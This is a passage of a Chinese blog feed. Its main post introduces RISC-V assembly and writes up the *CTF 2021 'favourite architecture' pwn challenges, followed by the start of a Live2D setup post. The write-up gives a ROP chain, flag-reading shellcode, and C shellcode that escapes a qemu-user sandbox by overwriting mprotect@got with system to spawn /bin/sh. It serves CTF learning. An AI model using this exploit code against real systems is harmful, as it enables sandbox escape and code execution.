class="line">_swap:</span><br><span class="line">    cmpq %rcx, %rbx</span><br><span class="line">    jg _init_loop</span><br><span class="line">    movq (%rbx), r10</span><br><span class="line">    movq (%rcx), r11</span><br><span class="line">    movq r10, (%rcx)</span><br><span class="line">    movq r11, (%rbx)</span><br><span class="line">    incq %rbx</span><br><span class="line">    decq %rcx</span><br><span class="line"></span><br><span class="line">_recursive1:</span><br><span class="line">    cmpq %r9, %rbx</span><br><span class="line">    jge _recursive2</span><br><span class="line">    movq %rbx, %rdi</span><br><span class="line">    movq %r9, %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    jmp _recursive2</span><br><span class="line"></span><br><span class="line">_recursive2:</span><br><span class="line">    cmpq %rcx, %r8</span><br><span class="line">    jge _after_loop</span><br><span class="line">    movq %r8, %rdi</span><br><span class="line">    movq %rcx, %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    jmp _after_loop</span><br><span class="line"></span><br><span class="line">_after_loop:</span><br><span class="line">    movq %rbp, %rsp</span><br><span class="line">    popq %rbp</span><br><span class="line">    retq</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    movq array, %rdi</span><br><span class="line">    leaq (array, 10, 4), %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    movl $0, %edi</span><br><span class="line">    movl $60, %eax</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/flyoutsan/article/details/62237779">https://blog.csdn.net/flyoutsan/article/details/62237779</a></p>
<p><a href="https://www.cnblogs.com/orlion/p/5765339.html">https://www.cnblogs.com/orlion/p/5765339.html</a></p>
<p>还有CSAPP的Chapter 3。不愧是CSAPP。</p>
]]></content>
      <tags>
        <tag>Kap0k pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>First Presentation in Kap0k</title>
    <url>/2021/03/27/First-Presentation-in-Kap0k/</url>
    <content><![CDATA[<h1 id="RISC-V的分享"><a href="#RISC-V的分享" class="headerlink" title="RISC-V的分享"></a>RISC-V的分享</h1><p>讲一讲RISC-V的内容吧，最近跟着一个跟RISC-V有关的开源项目玩了一下，对RISC-V有最基本的了解，就分享一下吧。</p>
<p>第一次做队内分享，讲的不对的话请大哥们指正。</p>
<h2 id="RISC-V了解"><a href="#RISC-V了解" class="headerlink" title="RISC-V了解"></a>RISC-V了解</h2><p><del>在qemu编译的时候写一写，等啊等</del></p>
<p>RISC-V作为PC端和嵌入式设备的新架构，不像x86那样有沉重的历史包袱，相比更加的精简与现代化。</p>
<p>去年华为专场的那场CTF就有挺多RISC-V方面的pwn题，了解了不亏。</p>
<p>RISC-V是大势所趋（逃</p>
<p><a href="https://metalcode.eu/2019-12-06-rv32i.html">RISC-V Cheat Sheet</a></p>
<a id="more"></a>
<h3 id="RISC-V的寄存器"><a href="#RISC-V的寄存器" class="headerlink" title="RISC-V的寄存器"></a>RISC-V的寄存器</h3><img data-src="http://qiniu.garen-wang.top/static/images/First-Presentation-in-Kap0k/riscv.png">
<p>RISC-V的寄存器有32个，从<code>x0</code>到<code>x31</code>。根据官方的调用规范，各寄存器有以下的性质：</p>
<ul>
<li><p><code>zero(x0)</code>是特殊的寄存器，任何时候值都为0。</p>
</li>
<li><p><code>ra(x1)</code>储存返回地址，在函数调用过程中会时常变化。caller saved</p>
</li>
<li><p><code>sp(x2)</code>相当于x86的<code>rsp/esp</code>，储存栈顶地址。callee saved</p>
</li>
<li><p><code>gp(x3)</code>和<code>tp(x4)</code>这两个寄存器很特殊，程序运行过程都不会变化，作用嘛，我想想……</p>
</li>
<li><p><code>a0(x10)-a7(x17)</code>是储存当前调用函数参数的寄存器。特别地：<code>a0</code>类似<code>rax</code>，储存返回值，<code>a7</code>传syscall的调用号。</p>
</li>
<li><p><code>pc</code>即program counter。</p>
</li>
<li><p><code>t1-t6</code>，是caller saved的temp寄存器。</p>
</li>
<li><p><code>s1-s11</code>，是callee saved的temp寄存器。</p>
</li>
</ul>
<h3 id="RISC-V汇编语句"><a href="#RISC-V汇编语句" class="headerlink" title="RISC-V汇编语句"></a>RISC-V汇编语句</h3><p><del>还在等toolchain的编译，忘开多进程了</del></p>
<p>在RISC-V中，想控制寄存器</p>
<p>由于汇编语句很多，并且存在很多伪指令（类似高级程序语言概念中的语法糖？），就只列举出重要的出来讲吧。</p>
<p><code>%hi(x)</code>和<code>%lo(x)</code>分别表示取<code>x</code>寄存器的高地址和低地址。</p>
<p><code>lb t0, 8(sp)</code>跟<code>sb t0, 8(sp)</code>是对称的，分别是读取内存储存到寄存器和读取寄存器恢复内存原始状态。</p>
<p>如何实现函数调用时的跳转？有两条汇编指令非常常用：</p>
<script type="math/tex; mode=display">{jal \qquad r_d,\quad  imm[20:1]}</script><script type="math/tex; mode=display">{jalr \quad r_d, \quad (imm[11:0])r_s}</script><p>作用是在$r_d$上保存下当前栈帧的<code>ra</code>，然后<code>pc</code>会跳转到与<code>pc</code>或者$r_s$的offset为$imm$的地址处。</p>
<p>而当函数要跳转回来时，相似地有<code>ret</code>的伪指令，这条指令会被认为是<code>jalr x0, 0(x1)</code>。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/First-Presentation-in-Kap0k/prologue_and_epilogue.png">
<p><a href="https://stackoverflow.com/questions/64211181/whats-the-difference-between-caller-saved-and-callee-saved-in-risc-v">关于caller saved和callee saved的细节讨论</a></p>
<p>找到<a href="https://web.eecs.utk.edu/~smarz1/courses/ece356/notes/assembly/">一篇不错的文章</a>，不懂的时候查一查就可以了。</p>
<h3 id="RISC-V实例"><a href="#RISC-V实例" class="headerlink" title="RISC-V实例"></a>RISC-V实例</h3><p>随便写了个类似helloworld的东西，拿到的<code>helloworld.s</code>，可以分析一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.file	&quot;helloworld.c&quot;</span><br><span class="line">	.option nopic</span><br><span class="line">	.text</span><br><span class="line">	.section	.rodata</span><br><span class="line">	.align	3</span><br><span class="line">.LC0:</span><br><span class="line">	.string	&quot;Helloworld, %d&quot;</span><br><span class="line">	.text</span><br><span class="line">	.align	1</span><br><span class="line">	.globl	helloworld</span><br><span class="line">	.type	helloworld, @function</span><br><span class="line">helloworld:</span><br><span class="line">  # prologue</span><br><span class="line">	addi	sp,sp,-32</span><br><span class="line">	sd	ra,24(sp)</span><br><span class="line">	sd	s0,16(sp)</span><br><span class="line"></span><br><span class="line">  # main part</span><br><span class="line">	addi	s0,sp,32</span><br><span class="line">	mv	a5,a0 # source of second parameter</span><br><span class="line">	sw	a5,-20(s0)</span><br><span class="line">	lw	a5,-20(s0)</span><br><span class="line">	mv	a1,a5 # second parameter</span><br><span class="line">	lui	a5,%hi(.LC0)</span><br><span class="line">	addi	a0,a5,%lo(.LC0) # first parameter</span><br><span class="line">	call	printf</span><br><span class="line">	nop</span><br><span class="line"></span><br><span class="line">  # epilogue</span><br><span class="line">	ld	ra,24(sp)</span><br><span class="line">	ld	s0,16(sp)</span><br><span class="line">	addi	sp,sp,32</span><br><span class="line">	jr	ra</span><br><span class="line">	.size	helloworld, .-helloworld</span><br><span class="line">	.section	.rodata</span><br><span class="line">	.align	3</span><br><span class="line">.LC1:</span><br><span class="line">	.string	&quot;%d&quot;</span><br><span class="line">	.text</span><br><span class="line">	.align	1</span><br><span class="line">	.globl	main</span><br><span class="line">	.type	main, @function</span><br><span class="line">main:</span><br><span class="line">  # prologue of main</span><br><span class="line">	addi	sp,sp,-32</span><br><span class="line">	sd	ra,24(sp)</span><br><span class="line">	sd	s0,16(sp)</span><br><span class="line"></span><br><span class="line">  # main part</span><br><span class="line">	addi	s0,sp,32</span><br><span class="line">	addi	a5,s0,-20</span><br><span class="line">	mv	a1,a5 # second parameter: address of x</span><br><span class="line">	lui	a5,%hi(.LC1)</span><br><span class="line">	addi	a0,a5,%lo(.LC1) # first parameter: &quot;helloworld, %d&quot;</span><br><span class="line">	call	__isoc99_scanf</span><br><span class="line">	lw	a5,-20(s0)</span><br><span class="line">	mv	a0,a5 # first parameter: address of x</span><br><span class="line">	call	helloworld</span><br><span class="line">	li	a5,0 # clear a5</span><br><span class="line">	mv	a0,a5 # clear a0</span><br><span class="line"></span><br><span class="line">  # epilogue of main</span><br><span class="line">	ld	ra,24(sp)</span><br><span class="line">	ld	s0,16(sp)</span><br><span class="line">	addi	sp,sp,32</span><br><span class="line">	jr	ra</span><br><span class="line">	.size	main, .-main</span><br><span class="line">	.ident	&quot;GCC: (GNU) 10.2.0&quot;</span><br><span class="line">	.section	.note.GNU-stack,&quot;&quot;,@progbits</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="RISC-V环境配置"><a href="#RISC-V环境配置" class="headerlink" title="RISC-V环境配置"></a>RISC-V环境配置</h2><p>Ubuntu 18.04中可以配置RISC-V GNU Toolchain，内含RISCV架构下的<code>gcc</code>、<code>gdb</code>、<code>as</code>、<code>ld</code>、<code>readelf</code>等必不可少的工具。</p>
<p>同时当然也需要安装qemu，方便运行RV64的二进制文件。</p>
<p>有趣的是：以上的工具都需要编译安装，所需时间稍长。建议make的时候手动把进程拉满。</p>
<h2 id="例题：starctf-2021-pwn-amp-re-favorite-architecture"><a href="#例题：starctf-2021-pwn-amp-re-favorite-architecture" class="headerlink" title="例题：starctf 2021 pwn&amp;re favorite architecture"></a>例题：starctf 2021 pwn&amp;re favorite architecture</h2><h3 id="favorite-architecture-1"><a href="#favorite-architecture-1" class="headerlink" title="favorite architecture 1"></a>favorite architecture 1</h3><p>有个patch挺重要的，要先看一看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff --git a&#x2F;linux-user&#x2F;syscall.c b&#x2F;linux-user&#x2F;syscall.c</span><br><span class="line">index 27adee9..2d75464 100644</span><br><span class="line">--- a&#x2F;linux-user&#x2F;syscall.c</span><br><span class="line">+++ b&#x2F;linux-user&#x2F;syscall.c</span><br><span class="line">@@ -13101,8 +13101,31 @@ abi_long do_syscall(void *cpu_env, int num, abi_long arg1,</span><br><span class="line">         print_syscall(cpu_env, num, arg1, arg2, arg3, arg4, arg5, arg6);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">-    ret &#x3D; do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span><br><span class="line">-                      arg5, arg6, arg7, arg8);</span><br><span class="line">+    switch (num) &#123;</span><br><span class="line">+        &#x2F;&#x2F; syscall whitelist</span><br><span class="line">+        case TARGET_NR_brk:</span><br><span class="line">+        case TARGET_NR_uname:</span><br><span class="line">+        case TARGET_NR_readlinkat:</span><br><span class="line">+        case TARGET_NR_faccessat:</span><br><span class="line">+        case TARGET_NR_openat2:</span><br><span class="line">+        case TARGET_NR_openat:</span><br><span class="line">+        case TARGET_NR_read:</span><br><span class="line">+        case TARGET_NR_readv:</span><br><span class="line">+        case TARGET_NR_write:</span><br><span class="line">+        case TARGET_NR_writev:</span><br><span class="line">+        case TARGET_NR_mmap:</span><br><span class="line">+        case TARGET_NR_munmap:</span><br><span class="line">+        case TARGET_NR_exit:</span><br><span class="line">+        case TARGET_NR_exit_group:</span><br><span class="line">+        case TARGET_NR_mprotect:</span><br><span class="line">+            ret &#x3D; do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span><br><span class="line">+                    arg5, arg6, arg7, arg8);</span><br><span class="line">+            break;</span><br><span class="line">+        default:</span><br><span class="line">+            printf(&quot;[!] %d bad system call\n&quot;, num);</span><br><span class="line">+            ret &#x3D; -1;</span><br><span class="line">+            break;</span><br><span class="line">+    &#125;</span><br><span class="line"> </span><br><span class="line">     if (unlikely(qemu_loglevel_mask(LOG_STRACE))) &#123;</span><br><span class="line">         print_syscall_ret(cpu_env, num, ret, arg1, arg2,</span><br></pre></td></tr></table></figure>
<p>意思就是过滤了RISC-V的syscall指令，只剩下这几个让你用，没有<code>execve</code>。</p>
<p>checksec一下<code>main</code>文件，保护几乎都关了，ASLR也没有。是静态链接的二进制文件。</p>
<p>反编译打开，搜一下跟”flag”有关的字符串，定位main函数。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/First-Presentation-in-Kap0k/you_are.png">
<p>结果发现符号表没了，不能正常地得到编译结果，只能看到汇编。</p>
<p>在博客上找到一种解决方法：</p>
<blockquote>
<p>反编译出现 unknown error 时得手动改 gp 为 0x6f178（ctrl-A → ctrl-R → 找到gp寄存器并修改）(感谢@X1do0发现的解决方案)</p>
</blockquote>
<p>在哪里找得到？在0x101ec可以看见：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/First-Presentation-in-Kap0k/get_gp.png">
<p>得到的主函数反编译结果：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">UndefinedFunction_00010400</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  ulonglong uVar1;</span><br><span class="line">  longlong lVar2;</span><br><span class="line">  undefined auStack488 [<span class="number">192</span>];</span><br><span class="line">  undefined auStack296 [<span class="number">256</span>];</span><br><span class="line">  ulonglong uStack40;</span><br><span class="line">  longlong lStack32;</span><br><span class="line">  <span class="keyword">int</span> iStack20;<span class="comment">// cnt</span></span><br><span class="line">  </span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea28,<span class="number">0</span>);<span class="comment">// setvbuf</span></span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea20,<span class="number">0</span>);<span class="comment">// setvbuf</span></span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea18,<span class="number">0</span>);<span class="comment">// setvbuf</span></span><br><span class="line">  FUN_0001605a(<span class="string">&quot;Input the flag: &quot;</span>);<span class="comment">// output</span></span><br><span class="line">  FUN_00016a5a(auStack296);<span class="comment">// read your input</span></span><br><span class="line">  uVar1 = FUN_000204e4(auStack296);<span class="comment">// get string</span></span><br><span class="line">  <span class="keyword">if</span> (uVar1 == ((longlong)(iRam000000000006e9dc + iRam000000000006e9d8) &amp; <span class="number">0xffffffff</span>U)) &#123;</span><br><span class="line">    lStack32 = FUN_00020386(auStack296 + ((longlong)iRam000000000006e9d8 &amp; <span class="number">0xffffffff</span>));</span><br><span class="line">    FUN_0001118a(auStack488,<span class="string">&quot;tzgkwukglbslrmfjsrwimtwyyrkejqzo&quot;</span>,<span class="string">&quot;oaeqjfhclrqk&quot;</span>,<span class="number">0x80</span>);</span><br><span class="line">    FUN_000111ea(auStack488,auStack296,iRam000000000006e9d8);</span><br><span class="line">    lVar2 = FUN_00020e2a(auStack296,&amp;DAT_0006d000,iRam000000000006e9d8);</span><br><span class="line">    <span class="keyword">if</span> (lVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      uStack40 = FUN_000204e4(lStack32);</span><br><span class="line">      iStack20 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (uStack40 &gt;&gt; <span class="number">3</span> &lt;= (ulonglong)(longlong)iStack20) &#123;</span><br><span class="line">          FUN_00016bc8(<span class="string">&quot;You are right :D&quot;</span>);<span class="comment">// output</span></span><br><span class="line">          gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        FUN_000102ae(iStack20 * <span class="number">8</span> + lStack32,&amp;DAT_0006d060);</span><br><span class="line">        lVar2 = FUN_00020e2a(iStack20 * <span class="number">8</span> + lStack32,(longlong)(iStack20 * <span class="number">8</span>) + <span class="number">0x6d030</span>,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (lVar2 != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        iStack20 = iStack20 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  FUN_00016bc8(<span class="string">&quot;You are wrong ._.&quot;</span>);<span class="comment">// output</span></span><br><span class="line">  gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实读入部分就是一个栈溢出，就有很多解法，既可以写shellcode，也可以写ROP。</p>
<p>RISC-V下的syscall跟x86的还是不一样，具体<a href="https://github.com/westerndigitalcorporation/RISC-V-Linux/blob/master/riscv-pk/pk/syscall.h">看表</a>。</p>
<p>如果用ROP打的话，ret2csu在rv64也是很好用的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00011772 93 07 84 b8     addi       a5,s0,-0x478</span><br><span class="line">00011776 13 09 09 b9     addi       s2,s2,-0x470</span><br><span class="line">0001177a 33 09 f9 40     sub        s2,s2,a5</span><br><span class="line">0001177e 13 59 39 40     srai       s2,s2,0x3</span><br><span class="line">00011782 63 0e 09 00     beq        s2,zero,LAB_0001179e</span><br><span class="line">00011786 13 04 84 b8     addi       s0,s0,-0x478</span><br><span class="line">0001178a 81 44           c.li       s1,0x0</span><br><span class="line">                     LAB_0001178c                                    XREF[1]:     0001179a(j)  </span><br><span class="line">0001178c 1c 60           c.ld       a5&#x3D;&gt;-&gt;FUN_00010284,0x0(s0&#x3D;&gt;-&gt;FUN_00010250)       &#x3D; 00010284</span><br><span class="line">                                                                                     &#x3D; 00010250</span><br><span class="line">0001178e 56 86           c.mv       a2,s5</span><br><span class="line">00011790 d2 85           c.mv       a1,s4</span><br><span class="line">00011792 4e 85           c.mv       a0,s3</span><br><span class="line">00011794 85 04           c.addi     s1,0x1</span><br><span class="line">00011796 82 97           c.jalr     a5&#x3D;&gt;FUN_00010284                                 undefined FUN_00010250()</span><br><span class="line">                                                                                     undefined FUN_00010284()</span><br><span class="line">00011798 21 04           c.addi     s0,0x8</span><br><span class="line">0001179a e3 19 99 fe     bne        s2,s1,LAB_0001178c</span><br><span class="line">                     LAB_0001179e                                    XREF[1]:     00011782(j)  </span><br><span class="line">0001179e e2 70           c.ldsp     ra,0x38(sp)</span><br><span class="line">000117a0 42 74           c.ldsp     s0,0x30(sp)</span><br><span class="line">000117a2 a2 74           c.ldsp     s1,0x28(sp)</span><br><span class="line">000117a4 02 79           c.ldsp     s2,0x20(sp)</span><br><span class="line">000117a6 e2 69           c.ldsp     s3,0x18(sp)</span><br><span class="line">000117a8 42 6a           c.ldsp     s4,0x10(sp)</span><br><span class="line">000117aa a2 6a           c.ldsp     s5,0x8(sp)</span><br><span class="line">000117ac 21 61           c.addi16sp sp,0x40</span><br><span class="line">000117ae 82 80           ret</span><br></pre></td></tr></table></figure>
<p>因为代码是一样的，只是在架构层面不同，大体思路跟x86下利用是差不多的，不过还是有些差别。</p>
<ol>
<li>第一条ROP：0x1179e。控制s0为gets + 0x478，控制s2为gets + 0x470，控制ra为0x11772。</li>
<li>执行完ret后跳到第二条ROP：0x11772。通过第一步的构造我们能够满足0x11782的beq条件成立，直接跳转到0x1179e。</li>
<li>第三条ROP：0x1179e。控制s3为bss地址，s1为0，s2为1，ra为0x1178e。</li>
<li>执行完ret后调到第四条ROP：0x1178e。a0为bss地址，s1=0+1=1=s2，满足0x11796的跳转条件，执行<code>gets(bss_addr)</code>。</li>
</ol>
<p>同时shellcode也同样可行，主要的思路是运用三个RISC-V下的系统调用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ riscv64-unknown-linux-gnu-as shellcode.s -o shellcode</span><br><span class="line">$ riscv64-unknown-linux-gnu-objcopy -S -o binary -j .text shellcode shellcode.bin</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">.option rvc</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">  li a1,0x67616c66 #flag</span><br><span class="line">  sd a1,8(sp)</span><br><span class="line">  addi a1,sp,8</span><br><span class="line">  li a0,-100</span><br><span class="line">  li a2,0</span><br><span class="line">  li a7, 56 # 56: openat</span><br><span class="line">  ecall</span><br><span class="line">	</span><br><span class="line">  c.mv a2,a7</span><br><span class="line">  addi a7,a7,7 # 63: read</span><br><span class="line">  ecall</span><br><span class="line">  li a0, 1</span><br><span class="line">  addi a7,a7,1 # 64: write</span><br><span class="line">  ecall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这三个系统调用都在白名单里面，写好shellcode直接注入即可。</p>
<h3 id="favourite-architecture-2"><a href="#favourite-architecture-2" class="headerlink" title="favourite architecture 2"></a>favourite architecture 2</h3><p>第一次接触这种qemu沙箱逃逸的题目，看了好多师傅的博客，终于差不多看懂了，做一下记录。</p>
<p>之所以可以从qemu中逃逸出来，是因为qemu-user的内存布局跟主系统的内存布局有很紧密的联系。</p>
<p>经过测试，从qemu-user的沙箱里面，基本可以向qemu执行的程序之外的一定内存空间做任意地址读、任意地址写。</p>
<p>同样是利用上一题栈溢出的漏洞为基础继续做，只不过这次不读取<code>flag</code>，读取<code>/proc/self/maps</code>，查看内存情况。</p>
<p>本来想在gdb里面调试看内存的，结果看不见前面的内存。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/First-Presentation-in-Kap0k/vmmap1.png">
<p>msk师傅告诉我这是虚拟地址，确实是这样。</p>
<p>可以通过访问<code>/proc/self/maps</code>看到当前内存布局，结果发现看了个寂寞：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/First-Presentation-in-Kap0k/cat_maps_failed.png">
<p>有师傅去看了qemu的源码分析，发现原来是qemu塞了个假的内存分布信息给你。（你被骗了</p>
<p>师傅们有很多的解法，其中一种是改成<code>/./proc/self/maps</code>，就能得到正确的内存分布情况。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/First-Presentation-in-Kap0k/cat_maps_successfully.png">
<p>剩下的内容就是pwn的常规操作：</p>
<ol>
<li>通过实际内存分布信息，找到qemu的基地址和libc的基地址。</li>
<li>查偏移，查出<code>mprotect@got</code>，<code>system</code>和rodata的偏移，利用前面的两个基地址推出实际地址。</li>
<li>首先利用<code>mprotect</code>把rodata的一段内容改为可写，并在这段首写入<code>/bin/sh\x00</code>。</li>
<li>劫持<code>mprotect</code>的got表为<code>system</code>函数。</li>
<li>最后执行shellcode，调用<code>mprotect@got</code>，参数为rodata段首，执行<code>system(&quot;/bin/sh\x00&quot;)</code>。</li>
</ol>
<p>只不过这道题要劫持控制流，比较方便的方法还是使用ret2shellcode。</p>
<p>可以利用C生成出shellcode，下面是示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int openat(int dirfd, char* pathname, int flags);</span><br><span class="line">int read(int fd, void *buf,int size);</span><br><span class="line">int write(int fd, void *buf, int size);</span><br><span class="line">int mprotect(void* addr, unsigned long len, int prot);</span><br><span class="line">void exit(int no);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">	char filename[32];</span><br><span class="line">	filename[0] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	filename[1] &#x3D; &#39;.&#39;;</span><br><span class="line">	filename[2] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	filename[3] &#x3D; &#39;p&#39;;</span><br><span class="line">	filename[4] &#x3D; &#39;r&#39;;</span><br><span class="line">	filename[5] &#x3D; &#39;o&#39;;</span><br><span class="line">	filename[6] &#x3D; &#39;c&#39;;</span><br><span class="line">	filename[7] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	filename[8] &#x3D; &#39;s&#39;;</span><br><span class="line">	filename[9] &#x3D; &#39;e&#39;;</span><br><span class="line">	filename[10] &#x3D; &#39;l&#39;;</span><br><span class="line">	filename[11] &#x3D; &#39;f&#39;;</span><br><span class="line">	filename[12] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	filename[13] &#x3D; &#39;m&#39;;</span><br><span class="line">	filename[14] &#x3D; &#39;a&#39;;</span><br><span class="line">	filename[15] &#x3D; &#39;p&#39;;</span><br><span class="line">	filename[16] &#x3D; &#39;s&#39;;</span><br><span class="line">	filename[17] &#x3D; &#39;\0&#39;;</span><br><span class="line"></span><br><span class="line">	unsigned char *buf &#x3D; (unsigned char*)0x6d000;</span><br><span class="line">	int fd &#x3D; openat(0, filename, 0);</span><br><span class="line">	read(fd, buf, 0xF80);</span><br><span class="line">	write(1, buf, 0xF80);</span><br><span class="line">	read(fd, buf, 0xF80);</span><br><span class="line">	write(1, buf, 0xF80);</span><br><span class="line">	read(fd, buf, 0xF80);</span><br><span class="line">	write(1, buf, 0xF80);</span><br><span class="line"></span><br><span class="line">	unsigned long rodata;</span><br><span class="line">	unsigned long mprotect_got;</span><br><span class="line">	unsigned long system_addr;</span><br><span class="line"></span><br><span class="line">	read(0, &amp;rodata, 8);</span><br><span class="line">	read(0, &amp;mprotect_got, 8);</span><br><span class="line">	read(0, &amp;system_addr, 8);</span><br><span class="line">	mprotect((void *)rodata, 0x3c000, 7);</span><br><span class="line"></span><br><span class="line">	*(unsigned long *)mprotect_got &#x3D; system_addr;</span><br><span class="line"></span><br><span class="line">	buf[0] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	buf[1] &#x3D; &#39;b&#39;;</span><br><span class="line">	buf[2] &#x3D; &#39;i&#39;;</span><br><span class="line">	buf[3] &#x3D; &#39;n&#39;;</span><br><span class="line">	buf[4] &#x3D; &#39;&#x2F;&#39;;</span><br><span class="line">	buf[5] &#x3D; &#39;s&#39;;</span><br><span class="line">	buf[6] &#x3D; &#39;h&#39;;</span><br><span class="line">	buf[7] &#x3D; &#39;\0&#39;;</span><br><span class="line"></span><br><span class="line">	mprotect(buf, 0x1000, 7);	&#x2F;&#x2F; this will call system(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">	exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;openat:\n&quot;</span><br><span class="line">		&quot;li a7, 56\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;read:\n&quot;</span><br><span class="line">		&quot;li a7, 63\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;write:\n&quot;</span><br><span class="line">		&quot;li a7, 64\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;mprotect:\n&quot;</span><br><span class="line">		&quot;li a7, 226\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm(&quot;exit:\n&quot;</span><br><span class="line">		&quot;li a7, 93\n&quot;</span><br><span class="line">		&quot;ecall\n&quot;</span><br><span class="line">		&quot;ret\n&quot;);</span><br></pre></td></tr></table></figure>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol>
<li><a href="https://en.wikipedia.org/wiki/RISC-V">https://en.wikipedia.org/wiki/RISC-V</a></li>
<li><a href="https://inst.eecs.berkeley.edu/~cs61c/resources/su18_lec/Lecture7.pdf">https://inst.eecs.berkeley.edu/~cs61c/resources/su18_lec/Lecture7.pdf</a></li>
<li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/14/getshell2/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/14/getshell2/</a></li>
<li><a href="https://github.com/BrieflyX/ctf-pwns/tree/master/escape/favourite_architecture">https://github.com/BrieflyX/ctf-pwns/tree/master/escape/favourite_architecture</a></li>
<li><a href="https://pullp.github.io/2021/01/23/starctf-2021-writeup/">https://pullp.github.io/2021/01/23/starctf-2021-writeup/</a></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Hexo Live2d moc3 Configuration</title>
    <url>/2021/07/23/Hexo-Live2d-moc3-Configuration/</url>
    <content><![CDATA[<p>今天闲着给自己的博客整了个效果，在live2d这方面整点花活。</p>
<p>记录一下，顺便也给hexo博客搭建live2d的方式做一次梳理。</p>
<p>live2d模型一般有几种常见的格式，其中方便web端渲染呈现的有moc跟moc3两种格式。</p>
<p>一般我们从大佬们白嫖到live2d模型下载解压之后会是这样的格式：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/Hexo-Live2d-moc3-Configuration/tree.png">
<p>以jiaran4为例：</p>
<ul>
<li><code>jiaran4.2048</code>或<code>jiaran4.1024</code>存放了模型的材质贴图</li>
<li><code>jiaran4.moc3</code>为模型主体，为二进制文件</li>
<li><code>jiaran4.model3.json</code>为模型的配置文件，会重点标注出其他文件的引用路径</li>
<li><code>jiaran4.physics3.json</code>是物理演算配置文件</li>
<li><code>jiaran4.cdi3.json</code>作为显示信息，不是很重要</li>
</ul>
<p>比较豪华的live2d模型还有：</p>
<ul>
<li><code>jiaran4.pose3.json</code>，初始姿势配置文件</li>
<li><code>motions</code>文件夹，内含若干个<code>xxx.motion3.json</code>的动作配置文件</li>
</ul>
<a id="more"></a>
<h2 id="moc模型"><a href="#moc模型" class="headerlink" title="moc模型"></a>moc模型</h2><p>以我拿到的一个崩2德莉莎的模型为例，目的是想要在hexo博客上实装。</p>
<p>是hexo的话，可以方便地使用<a href="https://github.com/EYHN/hexo-helper-live2d">hexo-helper-live2d</a>这么一个插件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install --save hexo-helper-live2d</span></span><br></pre></td></tr></table></figure>
<p>这个插件有若干个预设模型，随便扒拉几个看下：</p>
